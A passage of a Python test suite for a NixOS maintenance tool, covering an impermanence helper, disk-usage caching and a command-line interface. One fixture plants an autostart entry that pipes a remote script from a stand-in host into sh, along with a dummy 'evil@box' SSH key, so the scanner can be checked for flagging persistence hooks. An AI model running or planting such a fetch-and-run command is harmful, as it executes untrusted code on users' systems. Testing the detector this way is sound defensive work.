        self.assertEqual(facts["envrc_state"], "none")
        self.assertEqual(facts["files"], "")

    def test_devenv_rejects_missing_directories(self):
        result = self.run_helper("devenv", "inspect", str(self.root / "missing"))
        self.assertEqual(result.returncode, 2)
        self.assertIn("not a directory", result.stderr)


class Impermanence(HelperCase):
    """The persistent-folder helper against a fixture that mirrors a btrfs
    rollback setup: /@persist mounted at <root>/persist with entries bound out."""

    def setUp(self):
        super().setUp()
        self.persist = self.root / "persist"
        home = self.persist / "home/u"
        for d in (
            ".ssh",
            ".config/autostart",
            ".config/systemd/user",
            ".cache/foo",
            "Downloads",
            "Documents/old",
            ".local/bin",
        ):
            (home / d).mkdir(parents=True)
        (self.persist / "var/lib/bluetooth").mkdir(parents=True)
        (self.persist / "var/lib/docker").mkdir(parents=True)
        (self.persist / "var/log").mkdir(parents=True)
        (home / ".ssh/authorized_keys").write_text("ssh-ed25519 AAAASECRETKEYMATERIAL evil@box\n")
        (home / ".config/autostart/upd.desktop").write_text('Exec=sh -c "curl http://x.y/z | sh"\n')
        (home / ".config/systemd/user/legit.service").write_text("[Service]\nExecStart=/bin/true\n")
        os.symlink("/nix/store/abc-hm/x.service", home / ".config/systemd/user/managed.service")
        (home / "Downloads/run.sh").write_text("#!/bin/sh\n")
        (home / "Downloads/run.sh").chmod(0o755)
        (home / ".local/bin/mytool").write_text("x")
        (home / ".local/bin/mytool").chmod(0o4755)
        (home / ".cache/foo/blob").write_bytes(b"0" * 3_000_000)
        old = home / "Documents/old/big.iso"
        old.write_bytes(b"0" * 2_000_000)
        os.utime(old, (1_500_000_000, 1_500_000_000))
        os.utime(old.parent, (1_500_000_000, 1_500_000_000))
        (home / "Documents" / "bad\nname").write_text("x")
        (self.persist / "var/log/syslog.1.gz").write_text("old")
        p = self.persist
        (self.root / "mountinfo").write_text(
            "20 1 0:20 /@root / rw - btrfs /dev/mapper/crypted rw\n"
            f"30 20 0:21 /@persist {p} rw - btrfs /dev/mapper/crypted rw\n"
            "31 20 0:21 /@persist/var/lib/bluetooth /var/lib/bluetooth rw - btrfs /dev/mapper/crypted rw\n"
            "32 20 0:21 /@persist/home/u/.ssh /home/u/.ssh rw - btrfs /dev/mapper/crypted rw\n"
            "33 20 0:21 /@persist/var/lib/docker /var/lib/docker rw - btrfs /dev/mapper/crypted rw\n"
            "34 20 0:22 /@nix /nix rw - btrfs /dev/mapper/crypted rw\n"
            "35 34 0:22 /@nix/store /nix/store ro - btrfs /dev/mapper/crypted rw\n"
        )
        self.env.update(
            NIXDATIFIER_MOUNTINFO=str(self.root / "mountinfo"),
            NIXDATIFIER_ROOT_BIRTH="2000000000",
            NIXDATIFIER_BTIME="2000000100",
        )
        self.home = home

    def rows(self, result):
        self.assertEqual(result.returncode, 0, result.stderr)
        return [line.split("\t") for line in result.stdout.splitlines()]

    def test_detect_finds_the_persist_root_and_its_entries(self):
        rows = self.rows(self.run_helper("impermanence", "detect", ""))
        self.assertIn(["volatile", "yes", "fresh"], rows)
        self.assertEqual([r[1] for r in rows if r[0] == "persist"], [str(self.persist)])
        targets = sorted(r[2] for r in rows if r[0] == "entry")
        # /nix/store is a bind mount too, but not an impermanence entry.
        self.assertEqual(targets, ["/home/u/.ssh", "/var/lib/bluetooth", "/var/lib/docker"])

    def test_sizes_measures_every_persisted_entry(self):
        (self.persist / "var/lib/bluetooth/pairing").write_bytes(b"0" * 100_000)
        rows = self.rows(self.run_helper("impermanence", "sizes", ""))
        self.assertTrue(all(r[0] == "E" for r in rows))
        by_target = {r[4]: r for r in rows}
        self.assertEqual(sorted(by_target), ["/home/u/.ssh", "/var/lib/bluetooth", "/var/lib/docker"])
        bluetooth = by_target["/var/lib/bluetooth"]
        self.assertEqual(bluetooth[1], "d")
        self.assertGreaterEqual(int(bluetooth[2]), 100_000)
        self.assertEqual(bluetooth[5], str(self.persist / "var/lib/bluetooth"))
        self.assertGreater(int(bluetooth[3]), 0)

    def test_detect_ignores_a_normal_system(self):
        (self.root / "mountinfo").write_text(
            "20 1 0:20 / / rw - ext4 /dev/sda1 rw\n35 20 0:20 /nix/store /nix/store ro - ext4 /dev/sda1 rw\n"
        )
        self.env["NIXDATIFIER_ROOT_BIRTH"] = "1500000000"
        rows = self.rows(self.run_helper("impermanence", "detect", ""))
        self.assertIn(["volatile", "no", ""], rows)
        self.assertEqual([r for r in rows if r[0] in ("persist", "entry")], [])

    def test_detect_accepts_a_manual_root(self):
        (self.root / "mountinfo").write_text("20 1 0:20 / / rw - tmpfs tmpfs rw\n")
        rows = self.rows(self.run_helper("impermanence", "detect", str(self.persist)))
        self.assertIn(["volatile", "yes", "tmpfs"], rows)
        self.assertEqual(
            [(r[1], r[2]) for r in rows if r[0] == "persist"],
            [(str(self.persist), "manual")],
        )

    def test_list_sizes_flags_and_escapes_names(self):
        rows = self.rows(self.run_helper("impermanence", "list", "", str(self.persist / "home/u")))
        self.assertEqual(rows[0][:3], ["D", str(self.persist / "home/u"), str(self.persist)])
        names = [r[-1] for r in rows[1:]]
        self.assertEqual(names[0], ".cache")  # largest first
        self.assertIn("Documents", names)
        docs = self.rows(self.run_helper("impermanence", "list", "", str(self.persist / "home/u/Documents")))
        self.assertIn("bad\\x0aname", [r[-1] for r in docs[1:]])
        self.assertIn("c", next(r for r in docs[1:] if r[-1] == "bad\\x0aname")[8])
        # The newest change inside a folder is reported, not just its own mtime.
        old = next(r for r in docs[1:] if r[-1] == "old")
        self.assertEqual(old[4], "1500000000")

    def test_list_also_describes_the_level_below(self):
        rows = self.rows(self.run_helper("impermanence", "list", "", str(self.persist / "home/u")))
        below = {(r[1], r[-1]): r for r in rows if r[0] == "G"}
        # One walk, two levels: the widget can open ~/.config without walking again.
        self.assertIn((".config", "autostart"), below)
        self.assertIn(("Documents", "old"), below)
        old = below[("Documents", "old")]
        self.assertEqual(old[2], "d")
        self.assertGreaterEqual(int(old[3]), 2_000_000)
        # Owners are looked up once per user, not per file, but still read as names.
        import pwd

        self.assertEqual(old[8], pwd.getpwuid(os.getuid()).pw_name)
        self.assertFalse([r for r in rows if r[0] == "X"])

    def test_huge_folders_list_the_largest_and_sum_up_the_rest(self):
        many = self.home / "many"
        many.mkdir()
        (many / "big").write_bytes(b"0" * 100_000)
        for i in range(3004):
            (many / f"f{i}").write_bytes(b"")
        rows = self.rows(self.run_helper("impermanence", "list", "", str(many)))
        listed = [r for r in rows if r[0] == "C"]
        self.assertEqual(len(listed), 3000)
        # The largest is never the one left out.
        self.assertIn("big", [r[-1] for r in listed])
        rest = [r for r in rows if r[0] == "R"]
        self.assertEqual(rest[0][1], "5")
        # Folders that fit say nothing is left out.
        small = self.rows(self.run_helper("impermanence", "list", "", str(self.home)))
        self.assertNotIn("R", [r[0] for r in small])

    def test_unreadable_or_missing_folders_are_not_reported_as_complete(self):
        locked = self.home / "Documents/locked"
        (locked / "inside").mkdir(parents=True)
        locked.chmod(0)
        try:
            rows = self.rows(self.run_helper("impermanence", "list", "", str(self.home / "Documents")))
        finally:
            locked.chmod(0o755)
        if os.getuid() != 0:
            # Totals below an unreadable folder are lower bounds, and say so.
            self.assertIn("P", [r[0] for r in rows])
        # A bound entry whose source is gone measures as failed, not as 0 bytes.
        import shutil

        shutil.rmtree(self.persist / "var/lib/bluetooth")
        rows = self.rows(self.run_helper("impermanence", "sizes", ""))
        bluetooth = next(r for r in rows if r[4] == "/var/lib/bluetooth")
        self.assertEqual(bluetooth[6], "failed")
        ssh = next(r for r in rows if r[4] == "/home/u/.ssh")
        self.assertEqual(ssh[6], "ok")

    def test_list_rejects_folders_outside_the_persistent_areas(self):
        result = self.run_helper("impermanence", "list", "", "/etc")
        self.assertEqual(result.returncode, 2)

    def test_scan_reports_hooks_and_never_key_material(self):
        out = self.run_helper("impermanence", "scan", "", "14")
        rows = self.rows(out)
        mine = [r for r in rows if r[2].startswith(str(self.persist))]
        found = {(r[0], r[1], r[2].replace(str(self.persist), "")) for r in mine}
        self.assertIn(
            ("high", "Suspicious command", "/home/u/.config/autostart/upd.desktop"),
            found,
        )
        self.assertIn(("high", "Setuid or setgid file", "/home/u/.local/bin/mytool"), found)
        self.assertIn(("medium", "Unusual file name", "/home/u/Documents/bad\\x0aname"), found)
        self.assertTrue(any(r[1] == "SSH access" for r in mine))
        # Links into the Nix store are declared in the configuration.
        self.assertFalse(any("managed.service" in r[2] for r in rows))
        self.assertNotIn("AAAASECRETKEYMATERIAL", out.stdout)

    def test_cleanup_offers_caches_logs_and_untouched_folders(self):
        rows = self.rows(self.run_helper("impermanence", "cleanup", "", "180"))
        # T: label size newest path status; S: kind size count newest path.
        path = {"T": 4, "S": 5}
        paths = {r[0] + ":" + r[path[r[0]]].replace(str(self.persist), "") for r in rows if r[0] in path}
        self.assertIn("T:/home/u/.cache/foo", paths)
        self.assertIn("T:/var/log/syslog.1.gz", paths)
        self.assertIn("S:/home/u/Documents/old", paths)
        cache = next(r for r in rows if r[0] == "T" and r[4].endswith(".cache/foo"))
        self.assertGreaterEqual(int(cache[2]), 3_000_000)
        self.assertEqual(cache[5], "ok")

    def test_remove_refuses_anything_that_would_break_the_system(self):
        for path, why in [
            (self.home / ".ssh", "protected"),
            (self.home / ".ssh/authorized_keys", "protected"),
            (self.persist / "var/lib/docker", "persisted"),
            (self.persist / "var/lib", "too high"),
            (self.home, "too high"),
            (self.persist, "not inside"),
            (Path("/etc/passwd"), "not inside"),
        ]:
            with self.subTest(path=str(path)):
                result = self.run_helper("impermanence", "remove", "", str(path))
                self.assertEqual(result.returncode, 2, result.stdout)
                self.assertIn(why, result.stderr)
                self.assertTrue(path.exists() or path == self.persist)

    def test_remove_deletes_inside_a_persistent_area_and_never_follows_links(self):
        target = self.home / ".cache/foo"
        result = self.run_helper("impermanence", "remove", "", str(target))
        self.assertEqual((result.returncode, result.stdout.strip()), (0, "removed"))
        self.assertFalse(target.exists())
        outside = self.root / "outside"
        outside.mkdir()
        (outside / "keep").write_text("x")
        link = self.home / "Documents/escape"
        os.symlink(outside, link)
        self.assertEqual(self.run_helper("impermanence", "remove", "", str(link)).returncode, 0)
        self.assertFalse(link.is_symlink())
        self.assertTrue((outside / "keep").exists())
        # The escaped form the list view prints addresses names with control characters.
        result = self.run_helper("impermanence", "remove", "", str(self.home / "Documents") + "/bad\\x0aname")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertFalse((self.home / "Documents" / "bad\nname").exists())


class StoragePerformance(HelperCase):
    def disk_mocks(self, payload):
        self.a = "/nix/store/" + "a" * 32 + "-a"
        self.b = "/nix/store/" + "b" * 32 + "-b"
        self.payload = self.root / "sizes.json"
        entries = payload.items() if isinstance(payload, dict) else ((p["path"], p) for p in payload)
        self.payload.write_text("".join(f"{path}   {meta['narSize']}\n" for path, meta in entries))
        self.script(self.bin / "nix", f"cat '{self.payload}'\n")
        self.script(self.bin / "nix-store", f"printf '%s\\n' '{self.b}' '{self.b}' '{self.b}.lock'\n")
        self.script(self.bin / "df", "[[ \"${@: -1}\" == /nix/store ]]; printf 'Avail\\n7000\\n'\n")
        self.script(self.bin / "du", "echo 'Unexpected filesystem walk' >&2; exit 99\n")

    def test_disk_database_sizes_without_walking_files(self):
        a = "/nix/store/" + "a" * 32 + "-a"
        b = "/nix/store/" + "b" * 32 + "-b"
        for payload in (
            {a: {"narSize": 100}, b: {"narSize": 250}},
            [{"path": a, "narSize": 100}, {"path": b, "narSize": 250}],
        ):
            self.disk_mocks(payload)
            result = self.run_helper("diskusage")
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(result.stdout.split("\x1e")[:3], ["350", "250", "7000"])
            self.assertGreater(int(result.stdout.split("\x1e")[3]), 0)

    def test_free_space_refresh_does_not_query_nix(self):
        self.disk_mocks({})
        self.script(self.bin / "nix-store", "exit 99\n")
        self.script(self.bin / "nix", "exit 99\n")
        result = self.run_helper("diskusage", "--free")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout, "7000")

    def test_disk_failed_gc_is_an_error_not_zero_and_cannot_be_cached(self):
        self.disk_mocks({})
        self.script(self.bin / "nix-store", 'echo "daemon unavailable" >&2; exit 1\n')
        result = self.run_helper("run", "cached", "disk:nar-v1", "1800", "--", str(HELPERS / "diskusage"))
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("daemon unavailable", result.stderr)
        self.assertEqual(result.stdout, "")
        self.assertEqual(list((self.root / "cache/nixdatifier").glob("*.result")), [])

    def test_disk_uses_numeric_sizes_without_json_compatibility_retries(self):
        self.disk_mocks({})
        calls = self.root / "nix-calls"
        self.script(
            self.bin / "nix",
            f"""echo call >> '{calls}'
[[ "$*" == *"path-info --all --size"* ]]
[[ "$*" != *--json* ]]
printf '{self.b} 300\\n'
""",
        )
        result = self.run_helper("diskusage")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.split("\x1e")[:2], ["300", "300"])
        self.assertEqual(calls.read_text(), "call\n")

    def test_disk_bad_size_does_not_become_zero(self):
        self.disk_mocks({"bad": {"narSize": None}})
        self.assertNotEqual(self.run_helper("diskusage").returncode, 0)

    def test_store_usage_query_failure_does_not_claim_no_roots(self):
        store = self.root / "store"
        path = store / ("a" * 32 + "-app")
        (path / "bin").mkdir(parents=True)
        helper = self.root / "store-usage"
        helper.write_text((HELPERS / "store-usage").read_text().replace("/nix/store", str(store)))
        helper.chmod(0o755)
        self.script(self.bin / "nix-store", 'echo "permission denied" >&2; exit 1\n')
        self.script(self.bin / "nix", f"printf '%s 123\\n' '{path}'\n")
        result = subprocess.run(
            [str(helper), str(path / "bin")], env=self.env, capture_output=True, text=True, timeout=5, check=False
        )
        self.assertNotEqual(result.returncode, 0)
        self.assertEqual(result.stdout, "")
        self.script(self.bin / "nix-store", f"[[ \"${{@: -1}}\" == '{path}' ]]; exit 0\n")
        result = subprocess.run(
            [str(helper), str(path / "bin")], env=self.env, capture_output=True, text=True, timeout=5, check=False
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(result.stdout.split("\x1e"), ["", "", "123", "1", str(path)])

    def test_forced_cache_read_never_reuses_a_result_from_before_the_call(self):
        counter = self.root / "count"
        probe = self.script(self.bin / "probe", f"echo call >> '{counter}'; cat '{counter}'\n")
        for scope in ("disk", "disk:nar-v1", "impermanence"):
            with self.subTest(scope=scope):
                args = ("cached", scope, "0", "--", probe)
                first = self.run_helper("run", *args)
                second = self.run_helper("run", *args)
                self.assertEqual(first.returncode, 0, first.stderr)
                self.assertEqual(second.returncode, 0, second.stderr)
                self.assertEqual(len(second.stdout.splitlines()), len(first.stdout.splitlines()) + 1)

    def test_overlapping_forced_reads_share_the_new_result(self):
        counter = self.root / "count"
        probe = self.script(self.bin / "probe", f"echo call >> '{counter}'; sleep .3; cat '{counter}'\n")
        cmd = [str(HELPERS / "run"), "cached", "disk:nar-v1", "0", "--", probe]
        self.assertEqual(self.run_helper("run", *cmd[1:]).returncode, 0)
        jobs = [subprocess.Popen(cmd, env=self.env, stdout=subprocess.PIPE, text=True) for _ in range(2)]
        outputs = [p.communicate(timeout=5)[0] for p in jobs]
        self.assertEqual(outputs, ["call\ncall\n", "call\ncall\n"])
        self.assertEqual(len(counter.read_text().splitlines()), 2)

    def test_mutation_invalidates_even_a_measurement_still_in_flight(self):
        started = self.root / "started"
        proceed = self.root / "proceed"
        data = self.root / "data"
        data.write_text("before")
        probe = self.script(
            self.bin / "probe",
            f"""value=$(cat '{data}')
touch '{started}'
while [[ ! -f '{proceed}' ]]; do sleep .01; done
printf '%s' "$value"
""",
        )
        cmd = [str(HELPERS / "run"), "cached", "disk:nar-v1", "1800", "--", probe]
        job = subprocess.Popen(cmd, env=self.env, stdout=subprocess.PIPE, text=True)
        try:
            for _ in range(200):
                if started.exists():
                    break
                time.sleep(0.01)
            self.assertTrue(started.exists())
            change = self.script(self.bin / "change", f"printf after > '{data}'\n")
            self.assertEqual(self.run_helper("run", "mutate", "--", change).returncode, 0)
        finally:
            proceed.touch()
            job.communicate(timeout=5)
        result = self.run_helper("run", *cmd[1:])
        self.assertEqual(result.stdout, "after")

    def test_folder_cache_can_be_invalidated_after_deleting_contents(self):
        count = self.root / "count"
        probe = self.script(self.bin / "probe", f"echo call >> '{count}'; cat '{count}'\n")
        args = ("cached", "impermanence", "3600", "--", probe)
        self.assertEqual(self.run_helper("run", *args).stdout, "call\n")
        self.assertEqual(self.run_helper("run", "invalidate", "impermanence").returncode, 0)
        self.assertEqual(self.run_helper("run", *args).stdout, "call\ncall\n")


class Cli(HelperCase):
    """The nixdatifier command line, against a fake profiles directory."""

    def setUp(self):
        super().setUp()
        tools = self.root / "tools"
        shutil.copytree(HELPERS, tools)
        self.profiles = self.root / "profiles"
        for name in ("nixdatifier", "generations"):
            path = tools / name
            path.write_text(
                path.read_text()
                .replace("/nix/var/nix/profiles", str(self.profiles))
                .replace("/run/booted-system", str(self.root / "booted"))
            )
        self.cli = str(tools / "nixdatifier")
        self.env["XDG_CONFIG_HOME"] = str(self.root / "config")
        self.env.pop("NIXDATIFIER_CONFIG", None)
        self.profiles.mkdir()
        for number in (1, 2, 3):
            store = self.root / f"store{number}"
            store.mkdir()
            (store / "nixos-version").write_text(f"25.05.{number}")
            (self.profiles / f"system-{number}-link").symlink_to(store)
        (self.profiles / "system").symlink_to("system-3-link")
        (self.root / "booted").symlink_to(self.root / "store2")
        # Stand-ins for the commands that change the system.
        self.calls = self.root / "calls"
        for name in ("nix-env", "nix-collect-garbage"):
            self.script(self.bin / name, f"echo \"{name} $*\" >> '{self.calls}'; echo done\n")

    def cli_run(self, *args, **kwargs):
        return subprocess.run(
            [self.cli, *args], env=self.env, text=True, capture_output=True, timeout=15, check=False, **kwargs
        )

    def test_generations_json_marks_running_and_booted(self):
        rows = json.loads(self.cli_run("--json", "generations").stdout)
        self.assertEqual([r["number"] for r in rows], [3, 2, 1])
        self.assertEqual([r["active"] for r in rows], [True, False, False])
        self.assertEqual([r["booted"] for r in rows], [False, True, False])
        self.assertEqual(rows[0]["nixosVersion"], "25.05.3")
        limited = json.loads(self.cli_run("--json", "--limit", "1", "generations").stdout)
        self.assertEqual(len(limited), 1)

    def config_file(self):
        return Path(self.cli_run("config", "path").stdout.strip())

    def test_probe_settings_reject_invalid_values(self):
        for key in ("check_tarballs", "deep_inputs"):
            for value in ("on", "off"):
                self.assertEqual(self.cli_run("config", "set", key, value).returncode, 0)
            result = self.cli_run("config", "set", key, "false")
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("takes on or off", result.stderr)
            self.assertEqual(self.cli_run("config", "get", key).stdout.strip(), "off")

    def test_probe_settings_are_shared_through_the_config_file(self):
        window = {"checkTarballs": False, "deepInputCheck": True}
        self.cli_run("config", "sync", "pull", json.dumps(window))
        self.assertEqual(self.cli_run("config", "get", "check_tarballs").stdout.strip(), "off")
        self.assertEqual(self.cli_run("config", "get", "deep_inputs").stdout.strip(), "on")
        self.cli_run("config", "set", "check_tarballs", "on")
        later = json.loads(self.cli_run("config", "sync", "pull", json.dumps(window)).stdout)
        self.assertIs(later["checkTarballs"], True)  # clearing restores the default in the window
        self.assertIs(later["deepInputCheck"], True)
        self.cli_run("config", "unset", "deep_inputs")
        later = json.loads(self.cli_run("config", "sync", "pull", json.dumps(window)).stdout)
        self.assertIs(later["deepInputCheck"], False)

    def test_window_settings_sync_both_ways(self):
        window = {
            "flakePath": "/etc/nixos",
            "configRepoPath": "",
            "secretsPath": "",
            "secretsSourcePath": "",
            "githubTokenFile": "",
            "githubUseGh": False,
            "checkTarballs": True,
            "deepInputCheck": False,
            "impermanencePaths": "/persist",
            "checkInterval": 3600,
            "customCommands": json.dumps([{"label": "up", "cmd": "nix flake update"}]),
            "showNotifications": False,
        }
        # First start: the window's own values are adopted, its default interval is not.
        first = json.loads(self.cli_run("config", "sync", "pull", json.dumps(window)).stdout)
        self.assertEqual(self.cli_run("config", "get", "flake").stdout.strip(), "/etc/nixos")
        self.assertEqual(self.cli_run("config", "get", "persist").stdout.strip(), "/persist")
        self.assertEqual(self.cli_run("config", "get", "check_interval").stdout.strip(), "")
        self.assertEqual(self.cli_run("config", "get", "notifications").stdout.strip(), "off")
        self.assertIs(first["showNotifications"], False)
        self.assertEqual(json.loads(first["customCommands"]), [{"label": "up", "cmd": "nix flake update"}])
        # Afterwards the file wins: a change from the terminal view reaches the window, a clear too.
        self.cli_run("config", "set", "check_interval", "6h")
        self.cli_run("config", "unset", "flake")
        later = json.loads(self.cli_run("config", "sync", "pull", json.dumps(window)).stdout)
        self.assertEqual(later["checkInterval"], 21600)
        self.assertEqual(later["flakePath"], "")
        # The window changing something is written back, with the interval as a duration.
        window.update(flakePath="/x", checkInterval=7200, customCommands="[]")
        self.cli_run("config", "sync", "push", json.dumps(window))
        self.assertEqual(self.cli_run("config", "get", "flake").stdout.strip(), "/x")
        self.assertEqual(self.cli_run("config", "get", "check_interval").stdout.strip(), "2h")
        self.assertEqual(self.cli_run("config", "get", "commands").stdout.strip(), "[]")
        self.assertEqual(self.cli_run("config", "sync", "bogus", "{}").returncode, 2)

    def test_saved_commands_run_from_the_flake_directory(self):
        flake = self.root / "flake"
        flake.mkdir()
        (flake / "flake.nix").write_text("{}")
        self.assertEqual(self.cli_run("commands", "add", "hi", "echo ran-here $PWD").returncode, 0)
        self.assertIn("hi", self.cli_run("commands").stdout)
        result = self.cli_run("--yes", "--flake", str(flake), "run", "hi")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn(f"ran-here {flake}", result.stdout)
        self.assertEqual(self.cli_run("--yes", "run", "nope").returncode, 1)
        for n in range(2, 6):
            added = self.cli_run("commands", "add", f"c{n}", "true")
        self.assertEqual(added.returncode, 1)  # the window shows four
        self.assertEqual(self.cli_run("commands", "rm", "hi").returncode, 0)
        self.assertEqual(self.cli_run("config", "set", "commands", "not json").returncode, 2)

    def test_rebuild_prefers_the_saved_rebuild_command(self):
        flake = self.root / "flake"
        flake.mkdir()
        (flake / "flake.nix").write_text("{}")
        self.cli_run("commands", "add", "rebuild", "echo custom-rebuild")
        result = self.cli_run("--yes", "--flake", str(flake), "rebuild")
        self.assertIn("custom-rebuild", result.stdout)
        self.cli_run("commands", "rm", "rebuild")
        self.script(self.bin / "nixos-rebuild", f"echo \"nixos-rebuild $*\" >> '{self.calls}'\n")
        dry = self.cli_run("--dry-run", "--priv", "none", "--flake", str(flake), "rebuild")
        self.assertIn("switch --flake", dry.stdout)

    def test_typo_suggestions_do_not_run_commands(self):
        for args, suggestion in (
            (("generatoins",), "generations"),
            (("--limti", "2", "generations"), "--limit"),
            (("dev", "shwo"), "show"),
            (("persist", "cleanu"), "cleanup"),
            (("help", "generatoins"), "generations"),
            (("udpate",), "update"),
        ):
            with self.subTest(args=args):
                result = self.cli_run(*args)
                self.assertEqual(result.returncode, 2)
                self.assertIn("Did you mean:", result.stderr)
                self.assertIn(suggestion, result.stderr)
                self.assertEqual(result.stdout, "")
        self.assertFalse(self.calls.exists())

    def test_missing_option_value_is_usage_error(self):
        for args in (("--limit",), ("--flake", "--json", "updates")):
            result = self.cli_run(*args)
            self.assertEqual(result.returncode, 2)
            self.assertIn("needs a value", result.stderr)

    def test_generations_without_compgen(self):
        startup = self.root / "bash-startup"
        startup.write_text("enable -n compgen 2>/dev/null || true\n")
        self.env["BASH_ENV"] = str(startup)
        result = self.cli_run("--json", "generations")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(len(json.loads(result.stdout)), 3)

    def test_plain_output_has_no_header(self):
        lines = self.cli_run("--plain", "generations").stdout.splitlines()
        self.assertEqual(len(lines), 3)
        self.assertEqual(lines[0].split("\t")[0], "3")

    def test_changes_need_confirmation_and_refuse_protected_generations(self):
        asked = self.cli_run("delete", "1", stdin=subprocess.DEVNULL)
        self.assertEqual(asked.returncode, 1)
        self.assertIn("--yes", asked.stderr)
        for protected in ("3", "2"):
            result = self.cli_run("--yes", "delete", protected)
            self.assertEqual(result.returncode, 1)
            self.assertIn("cannot be deleted", result.stderr)
        self.assertEqual(self.cli_run("--yes", "delete", "9").returncode, 1)
        self.assertFalse(self.calls.exists())

    def test_delete_runs_command_and_records_history(self):
        result = self.cli_run("--yes", "--priv", "none", "--label", "Deleting…", "delete", "1")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn(f"--profile {self.profiles}/system --delete-generations 1", self.calls.read_text())
        entry = json.loads(self.cli_run("--json", "history").stdout)[0]
        self.assertEqual(
            (entry["action"], entry["label"], entry["genNum"], entry["success"]), ("delete", "Deleting…", 1, True)
        )

    def test_dry_run_changes_nothing(self):
        result = self.cli_run("--dry-run", "gc", "--older-than", "14d")
        self.assertEqual(result.returncode, 0)
        self.assertIn("[dry-run]", result.stdout)
        self.assertFalse(self.calls.exists())
        self.assertEqual(json.loads(self.cli_run("--json", "history").stdout), [])

    def test_gc_argument_validation_and_failure_is_recorded(self):
        self.assertEqual(self.cli_run("--yes", "gc", "--older-than", "soon").returncode, 2)
        self.script(self.bin / "nix-collect-garbage", "echo broke >&2; exit 4\n")
        result = self.cli_run("--yes", "--priv", "none", "gc", "--all")
        self.assertEqual(result.returncode, 4)
        entry = json.loads(self.cli_run("--json", "history").stdout)[0]
        self.assertEqual((entry["action"], entry["success"]), ("gc-all", False))
        self.assertIn("broke", entry["output"])

    def test_updates_lists_inputs(self):
        flake = self.root / "flake"
        flake.mkdir()
        (flake / "flake.nix").write_text("{}")
        lock = {
            "nodes": {
                "root": {"inputs": {"a": "a"}},
                "a": {"locked": {"type": "tarball", "rev": "abc", "lastModified": 0}, "original": {"type": "tarball"}},
            }
        }
        (flake / "flake.lock").write_text(json.dumps(lock))
        result = self.cli_run("--json", "--check", "--flake", str(flake), "updates", "--all")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertEqual(json.loads(result.stdout)[0]["status"], "pinned")

    def test_abbreviations_aliases_and_help(self):
        self.assertEqual(self.cli_run("--plain", "gen").stdout.splitlines()[0].split("\t")[0], "3")
        self.assertEqual(self.cli_run("ls", "--plain").returncode, 0)
        ambiguous = self.cli_run("s")
        self.assertEqual(ambiguous.returncode, 2)
        self.assertIn("could be", ambiguous.stderr)
        detail = self.cli_run("gc", "--help").stdout
        self.assertIn("--older-than 14d | --all", detail)
        self.assertIn("nixdatifier", self.cli_run("help", "delete").stdout)

    def test_status_is_one_line_and_json_for_scripts(self):
        line = self.cli_run("status").stdout.strip()
        self.assertTrue(line.startswith("gen 3"), line)
        data = json.loads(self.cli_run("--json", "status").stdout)
        self.assertEqual((data["running"], data["booted"], data["generations"]), (3, 2, 3))

    def test_delete_selects_by_keep_and_never_the_protected(self):
        result = self.cli_run("--dry-run", "delete", "--keep", "1")
        self.assertIn("Will delete: 1", result.stderr)
        self.assertNotIn("Will delete: 2", result.stderr)
        self.assertIn("--delete-generations 1", result.stdout)
        nothing = self.cli_run("--yes", "delete", "--keep", "9")
        self.assertIn("Nothing to delete", nothing.stderr)
        self.assertFalse(self.calls.exists())

    def test_rollback_switches_to_the_generation_before(self):
        result = self.cli_run("--dry-run", "rollback")
        self.assertIn("--switch-generation 2", result.stdout)

    def test_json_change_prints_one_result_object(self):
        result = self.cli_run("--yes", "--json", "--priv", "none", "delete", "1")
        self.assertEqual(json.loads(result.stdout), {"ok": True, "action": "delete", "exitCode": 0, "generation": 1})
        self.assertIn("done", result.stderr)

    def test_secrets_lists_names_but_never_values(self):
        deployed = self.root / "run-secrets"
        deployed.mkdir()
        (deployed / "wifi").write_text("hunter2")
        source = self.root / "secrets.yaml"
        source.write_text(
            "wifi: ENC[AES256_GCM,data:xx]\nsops:\n    version: 3.9.0\n    age:\n        - recipient: age1abc\n"
        )
        result = self.cli_run("--json", "secrets", "--secrets", str(deployed), "--source", str(source))
        self.assertNotIn("hunter2", result.stdout)
        data = json.loads(result.stdout)
        self.assertEqual(data["deployed"]["names"], ["wifi"])
        self.assertEqual(
            (data["source"]["encryption"], data["source"]["type"], data["source"]["recipients"]),
            ("encrypted", "age", 1),
        )

    def test_completion_scripts_are_valid(self):
        bash = self.cli_run("completion", "bash").stdout
        self.assertEqual(subprocess.run(["bash", "-n"], input=bash, text=True, check=False).returncode, 0)
        self.assertIn("__nixdatifier_candidates", self.cli_run("completion", "fish").stdout)
        self.assertEqual(self.cli_run("completion", "tcsh").returncode, 2)

    def test_completion_suggests_both_diff_generations(self):
        for words in (("diff", ""), ("diff", "3", ""), ("--json", "diff", "3", ""), ("gen", "--generation", "")):
            with self.subTest(words=words):
                result = self.cli_run("_complete", *words)
                self.assertEqual(result.returncode, 0, result.stderr)
                self.assertEqual(result.stdout.splitlines(), ["3", "2", "1"])
        self.assertEqual(self.cli_run("_complete", "diff", "3", "2", "").stdout, "")
        self.assertEqual(self.cli_run("_complete", "diff", "3", "2").stdout, "2\n")
        self.assertFalse(self.calls.exists())

    def test_completion_commands_options_and_flake_inputs(self):
        self.assertEqual(self.cli_run("_complete", "gener").stdout, "generations\n")
        self.assertEqual(self.cli_run("_complete", "diff", "--gen").stdout, "--generation\n")
        self.assertEqual(self.cli_run("_complete", "dev", "sh").stdout, "show\nshells\n")
        flake = self.root / "flake"
        flake.mkdir()
        (flake / "flake.nix").write_text("{}")
        (flake / "flake.lock").write_text(
            json.dumps({"nodes": {"root": {"inputs": {"nixpkgs": "nixpkgs", "home-manager": "hm"}}}})
        )
        self.assertEqual(self.cli_run("_complete", "--flake", str(flake), "update", "nix").stdout, "nixpkgs\n")

    def test_bash_completion_uses_invoked_executable_without_compgen(self):
        completion = self.root / "completion.bash"
        completion.write_text(self.cli_run("completion", "bash").stdout)
        result = subprocess.run(
            [
                "bash",
                "-c",
